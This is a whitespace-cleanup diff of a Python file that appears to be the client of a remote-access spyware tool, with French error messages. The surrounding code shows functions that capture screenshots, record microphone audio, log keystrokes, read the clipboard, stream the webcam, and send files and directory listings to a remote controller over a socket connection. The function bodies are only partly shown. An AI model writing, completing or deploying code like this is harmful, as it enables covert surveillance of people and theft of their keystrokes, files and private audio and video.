@@ -26,7 +26,6 @@ def take_and_send_screenshot(sio, user_id):
         print(f"Échec de la capture d'écran: {e}")
         pass
 
-
 def resize_image(image_bytes_io, base_width=1300):
     img = Image.open(image_bytes_io)
     w_percent = (base_width / float(img.size[0]))
@@ -35,7 +34,6 @@ def resize_image(image_bytes_io, base_width=1300):
     img_byte_arr = io.BytesIO()
     img.save(img_byte_arr, format='PNG')
     return img_byte_arr
-
 
 def record_and_send_audio(duration=10, sio=None, user_id=None):
     try:
@@ -61,14 +59,12 @@ def record_and_send_audio(duration=10, sio=None, user_id=None):
         print(f"Échec de l'enregistrement audio: {e}")
         pass
 
-
 def save_wave_file(file_io, audio_data):
     with wave.open(file_io, 'wb') as wave_file:
         wave_file.setnchannels(1)
         wave_file.setsampwidth(pyaudio.PyAudio().get_sample_size(pyaudio.paInt16))
         wave_file.setframerate(44100)
         wave_file.writeframes(audio_data)
-
 
 def record_and_send_keyboard_log(duration=10, sio=None, user_id=None):
     try:
@@ -83,7 +79,6 @@ def record_and_send_keyboard_log(duration=10, sio=None, user_id=None):
     except Exception as e:
         print(f"Échec de l'enregistrement du keylogger: {e}")
         pass
-
 
 def get_clipboard_content(sio=None, user_id=None):
     try:
@@ -124,7 +119,6 @@ def gen_frames(sio):
             camera.release()
         cv2.destroyAllWindows()
 
-
 def download_file(file_path, sio, user_id):
     try:
         if os.path.exists(file_path):
@@ -138,7 +132,6 @@ def download_file(file_path, sio, user_id):
             print("Fichier introuvable")
     except Exception as e:
         print(f"Échec de l'envoi du fichier: {e}")
-
 
 def list_dir(dir_path, sio):
     files_and_dirs = []
@@ -157,8 +150,7 @@ def list_dir(dir_path, sio):
                     else:
                         size = f"{size / 1024 ** 3:.2f} GB"
 
-                    files_and_dirs.append({'name': file_name,
-                                           'type': 'file'})
+                    files_and_dirs.append({'name': file_name, 'type': 'file'})
                 elif os.path.isdir(file_path):
                     files_and_dirs.append({'name': file_name, 'type': 'dir'})
             files_and_dirs.append({'path': dir_path})
